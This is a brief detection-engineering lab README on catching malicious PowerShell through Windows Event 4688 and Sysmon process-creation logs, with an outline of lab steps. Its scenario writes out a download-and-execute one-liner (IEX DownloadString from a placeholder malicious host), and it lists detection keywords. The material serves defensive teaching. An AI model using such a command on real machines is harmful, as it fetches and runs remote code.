# Detection Engineering Lab

This lab demonstrates how to detect suspicious PowerShell activity using Windows Event Logs and Sysmon.

## Lab Scenario

An attacker executes a PowerShell command that downloads and executes a malicious payload.

Example:

powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')"

## Detection Sources

- Windows Security Log (Event ID 4688)
- Sysmon Event ID 1 (Process Creation)

## Detection Logic

Alert when PowerShell runs with suspicious parameters:

- -nop
- -enc
- downloadstring
- IEX

## MITRE ATT&CK

Technique: T1059.001  
PowerShell

Attack Execution Steps
Step 1 – Encode PowerShell Command

Step 2 – Execute Encoded Command

Step 3 – PowerShell Execution

Step 4 – Event 4688 Generated

Step 5 – Command Line Details

Step 6 – Detection Confirmed
- Windows 11
- Sysmon
- Event Viewer
